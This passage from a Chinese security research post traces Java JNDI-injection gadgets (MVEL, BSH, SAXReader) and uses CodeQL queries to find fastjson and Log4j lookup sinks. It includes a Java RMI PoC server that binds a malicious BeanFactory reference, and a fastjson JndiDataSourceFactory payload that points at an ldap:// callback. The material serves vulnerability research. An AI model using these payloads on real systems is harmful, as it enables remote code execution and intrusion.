<p>传入的<code>command</code>参数是我们可控的点，这里处理完换行之后赋值给<code>c</code>，<code>this.inBuffer.append(c)</code>将c压入<code>inBuffer</code>中，执行<code>_exec()</code>,跟入：</p>
<p><img src="https://s2.loli.net/2022/07/11/I5luiJNz93Leo82.png" alt="image-20220630145551556"></p>
<p>处理<code>inBuffer</code>内容，以空格分离为数组之后将后面的参数赋值给<code>passParameters</code>，调用<code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>，我们继续跟入<code>execute</code>，走到<code>MVEL.eval</code>，这里new一个<code>MVELInterpretedRuntime</code>，调用<code>parse</code>方法：</p>
<p><img src="https://s2.loli.net/2022/07/11/dCxwoPO1Ni6jTRp.png" alt="image-20220630152653247"></p>
<p>接着调用<code>parseAndExecuteInterpreted</code>，走到<code>getReducedValue</code>中发现调用了<code>PropertyAccessor#get</code>,走到这里调用链就比较清晰了。最后在<code>getMethod</code>方法中触发：</p>
<p><img src="https://s2.loli.net/2022/07/11/kc1MRi3fCvmNKXD.png" alt="image-20220630153359771"></p>
<h3 id="BSH"><a href="#BSH" class="headerlink" title="BSH"></a>BSH</h3><h4 id="没啥意义的RCE"><a href="#没啥意义的RCE" class="headerlink" title="没啥意义的RCE:"></a>没啥意义的RCE:</h4><p><img src="https://s2.loli.net/2022/07/11/RsWzVCZT58KMyGh.png" alt="image-20220704112157355"></p>
<p>这个只能加载本地的恶意类，所以没啥意义。</p>
<p><img src="https://s2.loli.net/2022/07/11/6DtyHLZCfMlJOhb.png" alt="image-20220704112301104"></p>
<h4 id="RCE-eval"><a href="#RCE-eval" class="headerlink" title="RCE:eval"></a>RCE:eval</h4><p>这个利用方式已经被藏青@雁行安全团队找出来了。</p>
<h3 id="SAXReader"><a href="#SAXReader" class="headerlink" title="SAXReader"></a>SAXReader</h3><h4 id="URL探测-read"><a href="#URL探测-read" class="headerlink" title="URL探测:read"></a>URL探测:read</h4><p>并没有找到可以rce的点，不过其中的read方法可控，可以做url探测：</p>
<p><img src="https://s2.loli.net/2022/07/11/2gAl5WjQtp9yunr.png" alt="image-20220704165954276"></p>
<p>poc:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> JNDI<span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.dom4j.io.SAXReader"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=read"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"seturl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为控制的是<code>read</code>方法，各种尝试之后也没能打到XML解析（太菜了），只能做个URL探测玩玩。</p>
<h3 id="jdk-原生"><a href="#jdk-原生" class="headerlink" title="jdk 原生"></a>jdk 原生</h3><h2 id="fastjson-with-codeql"><a href="#fastjson-with-codeql" class="headerlink" title="fastjson with codeql"></a>fastjson with codeql</h2><p>此漏洞的sink是jndi注入点，所以我们需要找到调用了lookup方法的地方。同时，fastjson漏洞的利用方式是控制getter或者setter。那么我们的限制条件就如下：</p>
<ul>
<li>调用了lookup方法</li>
<li>在getter或者setter的递归中满足上条件</li>
</ul>
<p>构造ql语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java

class LookupMethod extends <span class="token keyword">Call</span> {
  LookupMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>
  }
}

class GetterCallable extends Callable {
  GetterCallable<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"get%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span>
    <span class="token operator">or</span>
    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"set%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
  }
}

query predicate edges<span class="token punctuation">(</span>Callable a<span class="token punctuation">,</span> Callable b<span class="token punctuation">)</span> { a<span class="token punctuation">.</span>polyCalls<span class="token punctuation">(</span>b<span class="token punctuation">)</span> }

<span class="token keyword">from</span> LookupMethod endcall<span class="token punctuation">,</span> GetterCallable entryPoint<span class="token punctuation">,</span> Callable endCallAble
<span class="token keyword">where</span>
  endcall<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> endCallAble <span class="token operator">and</span>
  edges<span class="token punctuation">(</span>entryPoint<span class="token punctuation">,</span> endCallAble<span class="token punctuation">)</span>
<span class="token keyword">select</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entryPoint<span class="token punctuation">,</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Geter jndi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以去<a href="https://lgtm.com进行在线查询。先在线导入mybatis-3：">https://lgtm.com进行在线查询。先在线导入mybatis-3：</a></p>
<p><img src="/.%5Ccodeql_for_java.assets%5Cimage-20220616172143632.png" alt="image-20220616172143632"></p>
<p>箭头处添加github链接，即可导入到自己的项目列表中</p>
<p>在线查询结果中存在大家都知道的fastjson 1.2.45黑名单绕过思路</p>
<p><img src="https://s2.loli.net/2022/07/11/Z3lWVYdeISsrAzk.png" alt="image-20220616172500693"></p>
<p>payload：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>
    <span class="token property">"properties"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们先对语句进行分析。</p>
<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class LookupMethod extends <span class="token keyword">Call</span> {
  LookupMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    this<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasName<span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>
  }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里是尝试定位到<code>jndi</code>注入的触发点<code>javax.naming#lookup</code>，并且需要是<code>Context</code>实例化对象进行<code>lookup</code>方法操作。</p>
<p><img src="https://s2.loli.net/2022/07/11/LG1TAI876FzqXiO.png" alt="image-20220616173005215"></p>
<p>定义继承<code>Call</code>的<code>LookupMethod</code>类来进行实现。在上面我们提到，<code>getCallee()</code> 返回函数声明的位置,指定方法名<code>lookup</code>；使用<code>getASupertype()</code>指向其所有父类，再使用<code>hasQualifiedName("javax.naming", "Context")</code>准确限制<code>import</code>中存在<code>import javax.naming.Context;</code>。</p>
<p><img src="https://s2.loli.net/2022/07/11/u6vcLi9FBG4kt7b.png" alt="image-20220617095549270"></p>
<p>单独实现此类使用ql查询，可获得所有能触发<code>jndi</code>注入的<code>lookup</code>方法。</p>
<p><img src="https://s2.loli.net/2022/07/11/UpvQmtxR12ZE9SL.png" alt="image-20220617095955811"></p>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">class GetterCallable extends Callable {
  GetterCallable<span class="token punctuation">(</span><span class="token punctuation">)</span> {
    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"get%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    hasNoParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span>
    <span class="token operator">or</span>
    getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>matches<span class="token punctuation">(</span><span class="token string">"set%"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
    getNumberOfParameters<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span>
  }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>实现继承<code>Callable</code>的<code>GetterCallable</code>类，用于查找所有的getter和setter使用<code>hasNoParameters()</code>限制getter无参，使用<code>getNumberOfParameters()</code>限制setter参数只有一个，使其符合fastjson漏洞的触发条件。</p>
<p>单独实现，获取所有符合条件的setter和getter：</p>
<p><img src="https://s2.loli.net/2022/07/11/sFBqOIlwMoKuDXA.png" alt="image-20220617101002542"></p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">query predicate edges<span class="token punctuation">(</span>Callable a<span class="token punctuation">,</span> Callable b<span class="token punctuation">)</span> { a<span class="token punctuation">.</span>polyCalls<span class="token punctuation">(</span>b<span class="token punctuation">)</span> }

<span class="token keyword">from</span> LookupMethod endcall<span class="token punctuation">,</span> GetterCallable entryPoint<span class="token punctuation">,</span> Callable endCallAble
<span class="token keyword">where</span>
  endcall<span class="token punctuation">.</span>getCallee<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> endCallAble <span class="token operator">and</span>
  edges<span class="token punctuation">(</span>entryPoint<span class="token punctuation">,</span> endCallAble<span class="token punctuation">)</span>
<span class="token keyword">select</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entryPoint<span class="token punctuation">,</span> endcall<span class="token punctuation">.</span>getCaller<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Geter jndi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主体的查询语句中定义了谓词<code>edges(Callable a, Callable b) { a.polyCalls(b) }</code>。这里查看的是函数声明的继承关系，如果我们想知道方法A到方法G之间调用端点路径，可以将<code>polyCalls</code>替换为<code>calls</code>来实现：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> java

class StartMethod extends Method {
  StartMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> { getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"main"</span> }
}

class TargetMethod extends Method {
  TargetMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> { getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"vulMain"</span> }
}

query predicate edges<span class="token punctuation">(</span>Method a<span class="token punctuation">,</span> Method b<span class="token punctuation">)</span> { a<span class="token punctuation">.</span>calls<span class="token punctuation">(</span>b<span class="token punctuation">)</span> }

<span class="token keyword">from</span> TargetMethod <span class="token keyword">end</span><span class="token punctuation">,</span> StartMethod entryPoint
<span class="token keyword">where</span> edges<span class="token operator">+</span><span class="token punctuation">(</span>entryPoint<span class="token punctuation">,</span> <span class="token keyword">end</span><span class="token punctuation">)</span>
<span class="token keyword">select</span> <span class="token keyword">end</span><span class="token punctuation">,</span> entryPoint<span class="token punctuation">,</span> <span class="token keyword">end</span><span class="token punctuation">,</span> <span class="token string">"Found a path from start to target."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>事实上调用谓词edges就是构建gadget的过程。</p>
<h2 id="Log4j-with-codeql"><a href="#Log4j-with-codeql" class="headerlink" title="Log4j with codeql"></a>Log4j with codeql</h2><p>找到了之前分析<code>log4j </code>的文章，网传<code>log4j</code>漏洞是在线查出来的<code>sink</code>点，找到了存在于老版本<code>log4j</code>的<code>lookup</code>方法。我们也跟着尝试一下构建ql语言看能不能把漏洞完整分析出来</p>
<p>log4j源码地址：<a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.14.1-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.14.1-rc1</a></p>
<p>codeql环境配置及使用方式请移步站内其他大哥的文章</p>
<p>先贴上调用链</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">lookup<span class="token operator">:</span><span class="token number">417</span><span class="token punctuation">,</span> <span class="token class-name">InitialContext</span> <span class="token punctuation">(</span>javax<span class="token punctuation">.</span>naming<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">172</span><span class="token punctuation">,</span> <span class="token class-name">JndiManager</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>net<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token class-name">JndiLookup</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>
lookup<span class="token operator">:</span><span class="token number">221</span><span class="token punctuation">,</span> <span class="token class-name">Interpolator</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>
resolveVariable<span class="token operator">:</span><span class="token number">1110</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>
substitute<span class="token operator">:</span><span class="token number">1033</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>
substitute<span class="token operator">:</span><span class="token number">912</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>
replace<span class="token operator">:</span><span class="token number">467</span><span class="token punctuation">,</span> <span class="token class-name">StrSubstitutor</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>
format<span class="token operator">:</span><span class="token number">132</span><span class="token punctuation">,</span> <span class="token class-name">MessagePatternConverter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">)</span>
format<span class="token operator">:</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token class-name">PatternFormatter</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>pattern<span class="token punctuation">)</span>
toSerializable<span class="token operator">:</span><span class="token number">344</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span>$<span class="token class-name">PatternSerializer</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>
toText<span class="token operator">:</span><span class="token number">244</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>
encode<span class="token operator">:</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>
encode<span class="token operator">:</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token class-name">PatternLayout</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>layout<span class="token punctuation">)</span>
directEncodeEvent<span class="token operator">:</span><span class="token number">197</span><span class="token punctuation">,</span> <span class="token class-name">AbstractOutputStreamAppender</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>appender<span class="token punctuation">)</span>
tryAppend<span class="token operator">:</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token class-name">AbstractOutputStreamAppender</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>appender<span class="token punctuation">)</span>
append<span class="token operator">:</span><span class="token number">181</span><span class="token punctuation">,</span> <span class="token class-name">AbstractOutputStreamAppender</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>appender<span class="token punctuation">)</span>
tryCallAppender<span class="token operator">:</span><span class="token number">156</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
callAppender0<span class="token operator">:</span><span class="token number">129</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
callAppenderPreventRecursion<span class="token operator">:</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
callAppender<span class="token operator">:</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token class-name">AppenderControl</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
callAppenders<span class="token operator">:</span><span class="token number">540</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
processLogEvent<span class="token operator">:</span><span class="token number">498</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
log<span class="token operator">:</span><span class="token number">481</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
log<span class="token operator">:</span><span class="token number">456</span><span class="token punctuation">,</span> <span class="token class-name">LoggerConfig</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
log<span class="token operator">:</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token class-name">DefaultReliabilityStrategy</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
log<span class="token operator">:</span><span class="token number">161</span><span class="token punctuation">,</span> <span class="token class-name">Logger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">)</span>
tryLogMessage<span class="token operator">:</span><span class="token number">2205</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
logMessageTrackRecursion<span class="token operator">:</span><span class="token number">2159</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
logMessageSafely<span class="token operator">:</span><span class="token number">2142</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
logMessage<span class="token operator">:</span><span class="token number">2017</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
logIfEnabled<span class="token operator">:</span><span class="token number">1983</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
error<span class="token operator">:</span><span class="token number">740</span><span class="token punctuation">,</span> <span class="token class-name">AbstractLogger</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>spi<span class="token punctuation">)</span>
